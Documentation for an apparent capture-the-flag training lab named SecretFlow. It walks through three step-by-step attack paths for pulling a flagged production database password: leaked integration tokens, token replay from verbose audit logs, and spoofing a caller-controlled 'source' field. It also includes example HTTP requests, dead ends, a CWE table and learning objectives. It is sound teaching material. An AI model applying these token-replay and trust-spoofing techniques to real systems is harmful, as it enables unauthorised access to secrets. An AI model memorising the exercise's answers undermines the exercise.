# SecretFlow - Attack Scenarios Documentation

## Overview

This document describes the three main attack paths to gain access to the CRITICAL secret `PROD_DB_MASTER_PASSWORD`.

---

## Attack Path 1: Integration Status Leak (Operational Endpoint)

**Difficulty:** Medium
**Prerequisites:** Valid user account (any role)

### Steps

1. **Login to the application**
   - Use credentials: `dev.alice` / `password123`

2. **Discover the integration status endpoint**
   - Use browser DevTools to inspect network traffic
   - Or enumerate API endpoints to find `/api/internal/integrations/status`
   - This endpoint looks like a legitimate operational health check

3. **Call the integration status endpoint**
   ```
   GET /api/internal/integrations/status
   Authorization: Bearer <your_token>
   ```

4. **Extract the integration token from response**
   - Response includes detailed integration status for "connectivity debugging":
   ```json
   {
     "integrations": [
       {
         "id": "uuid",
         "name": "GitLab CI",
         "provider": "gitlab",
         "status": "connected",
         "auth_token": "gf_prod_abc123xyz789",
         "webhook_url": "http://gitlab.internal/hooks/secretflow",
         "config": {...}
       }
     ]
   }
   ```
   - The `auth_token` field is exposed for "operational debugging"

5. **Find a CRITICAL secret ID**
   - Browse to `/secrets` and note the ID of `PROD_DB_MASTER_PASSWORD`
   - Or call `GET /api/secrets` and find the UUID

6. **Call the webhook endpoint with stolen token**
   ```
   POST /api/integrations/webhook
   Content-Type: application/json

   {
     "token": "gf_prod_abc123xyz789",
     "secret_id": "<uuid-of-prod-db-password>",
     "justification": "Automated deployment"
   }
   ```

7. **Receive the secret value**
   - Response includes `secret_value` field with the actual password:
   ```json
   {
     "access_granted": true,
     "secret_value": "flag{prod_db_master_3f8a6d1c9e247b50}",
     "grant_expires_at": "2024-03-31T12:00:00Z"
   }
   ```

### Why This Works

- Integration status endpoint exposes auth tokens under the guise of operational debugging
- Tokens are stored and transmitted in plaintext
- Webhook endpoint trusts any valid token without checking classification
- Auto-approved requests bypass normal approval workflow

---

## Attack Path 2: Audit Log Replay (Verbose Operational Logging)

**Difficulty:** Medium
**Prerequisites:** Access to audit logs (security_admin or endpoint discovery)

### Steps

1. **Gain access to audit logs**
   - Either as security_admin, or discover the endpoint returns data

2. **Find integration token usage events**
   ```
   GET /api/audit/logs?action=integration_token_used
   ```

3. **Extract token information from verbose log details**
   - Log entries include full operational details for troubleshooting:
   ```json
   {
     "action": "integration_token_used",
     "details": {
       "token_value": "gf_prod_abc123xyz789",
       "token_id": "uuid",
       "integration_id": "uuid",
       "integration_name": "GitLab CI",
       "provider": "gitlab",
       "project": "secretflow-prod",
       "request_body": {
         "secret_id": "uuid",
         "justification": "CI/CD deployment"
       },
       "diagnostic": {
         "trust_level": "auto_approved",
         "approval_bypassed": true
       }
     }
   }
   ```

4. **Learn the valid request structure**
   - The `request_body` field shows exactly what a valid webhook request looks like
   - Natural hint: "Automated access granted via GitLab pipeline"

5. **Replay valid webhook request**
   - Use the stolen token and request structure from logs:
   ```
   POST /api/integrations/webhook
   {
     "token": "gf_prod_abc123xyz789",
     "secret_id": "<uuid-of-prod-db-password>",
     "justification": "CI/CD deployment"
   }
   ```

6. **Receive the secret value**

### Why This Works

- Audit logs include full token values for "operational troubleshooting"
- Request bodies are logged for debugging integration issues
- Natural hints in logs guide attackers toward the webhook approach
- Token validation doesn't check request context

---

## Attack Path 3: Internal API Misuse (Insufficient Trust Validation)

**Difficulty:** Medium
**Prerequisites:** Valid user account, API discovery

### Steps

1. **Discover internal API endpoints**
   - Inspect network traffic or enumerate `/api/internal/` paths
   - Find `/api/internal/secrets/grant`

2. **Test the endpoint**
   ```
   POST /api/internal/secrets/grant
   Content-Type: application/json

   {
     "secret_id": "<uuid>",
     "user_id": "<your-user-id>",
     "source": "ui"
   }
   ```

3. **Learn source validation requirements**
   - Error message reveals: "Invalid source. Must be one of: webhook, internal, service_mesh"
   - Natural hint: These are the trusted automation sources

4. **Exploit the trust assumption**
   - The endpoint trusts the caller-provided `source` field
   - No verification that the request actually came from a trusted system
   ```
   POST /api/internal/secrets/grant
   {
     "secret_id": "<uuid-of-critical-secret>",
     "user_id": "<your-user-id>",
     "source": "webhook",
     "source_context": {
       "integration_id": "fake-id",
       "pipeline": "gitlab-ci"
     }
   }
   ```

5. **Receive auto-approved grant with secret value**
   - Backend creates grant with `auto_approved = true`
   - Response includes the secret value:
   ```json
   {
     "grant": {
       "id": "uuid",
       "auto_approved": true,
       "secret_value": "flag{prod_db_master_3f8a6d1c9e247b50}",
       "expires_at": "..."
     }
   }
   ```

### Alternative: Use /api/internal/apply endpoint

```
POST /api/internal/apply
{
  "request_id": "<pending-request-id>",
  "bypass_classification_check": true,
  "source": "internal"
}
```

This endpoint has no authentication check at all (security through obscurity).

### Why This Works

- Internal API trusts caller-provided `source` field without verification
- `source_context` is also caller-controlled and not validated
- Classification-based approval is bypassed for trusted sources
- No mechanism to verify the request actually came from a trusted system

---

## Dead Ends (What Doesn't Work)

### Dead End 1: Normal Request Flow
```
POST /api/secrets/:id/request
```
- Creates request with `status=pending`
- CRITICAL secrets require `security_admin` approval
- Request stays pending indefinitely for developer users
- **Learning:** Normal approval path is correctly enforced

### Dead End 2: Webhook Without Token
```
POST /api/integrations/webhook
{
  "secret_id": "..."
}
```
- Returns 401 Unauthorized: "Invalid integration token"
- Token validation queries database for exact match
- **Learning:** Webhook is protected. Need valid token first.

### Dead End 3: Internal Endpoint with Wrong Source
```
POST /api/internal/secrets/grant
{
  "source": "ui"
}
```
- Returns 403 Forbidden: "Invalid source"
- Source must be `webhook`, `internal`, or `service_mesh`
- **Learning:** Must use trusted source value

### Dead End 4: Accessing LOW/MEDIUM Secrets Only
- Browsing secrets catalog shows CRITICAL secrets exist
- Can freely access LOW/MEDIUM secrets but they don't contain the target
- `PROD_DB_MASTER_PASSWORD` is CRITICAL classification
- **Learning:** CRITICAL secrets are the goal. Normal path blocked.

### Dead End 5: Integration Test Without Auth
```
GET /api/internal/integrations/test/:id
```
- Returns 401 if not authenticated
- Requires valid JWT token
- **Learning:** Internal endpoints still require authentication

---

## Vulnerability Summary

| ID | Name | CWE | Location |
|----|------|-----|----------|
| V1 | Integration status leaks tokens | CWE-215 | GET /api/internal/integrations/status |
| V2 | Tokens in plaintext | CWE-256 | integration_tokens table |
| V3 | Token scope not enforced | CWE-284 | webhook_service.go |
| V4 | Source field not verified | CWE-284 | POST /api/internal/secrets/grant |
| V5 | Audit logs leak sensitive data | CWE-532 | audit_logs.details |
| V6 | Classification bypass | CWE-284 | approval_service.go |
| V7 | Missing auth on internal endpoint | CWE-306 | POST /api/internal/apply |

---

## Natural Hints Embedded in System

The system includes realistic operational messages that guide attackers:

1. **Audit log messages:**
   - "Automated access granted via GitLab pipeline"
   - "Trusted automation - GitLab CI/CD pipeline"
   - "Integration sync completed for project secretflow-prod"

2. **Integration status:**
   - Shows `auth_token` field for "connectivity debugging"
   - Shows `webhook_url` for integration endpoint

3. **Error messages:**
   - "Invalid source. Must be one of: webhook, internal, service_mesh"
   - Tells attacker exactly which values are trusted

---

## Learning Objectives

After completing this exercise, participants should understand:

1. **Trust boundaries** - Why internal APIs need the same security as public ones
2. **Defense in depth** - Single validation failures shouldn't compromise security
3. **Logging security** - Sensitive data in logs creates attack surface
4. **Configuration management** - Operational endpoints must be restricted
5. **Token handling** - Storage, validation, and scope enforcement
6. **Plausible vulnerabilities** - Real bugs look like operational features gone wrong
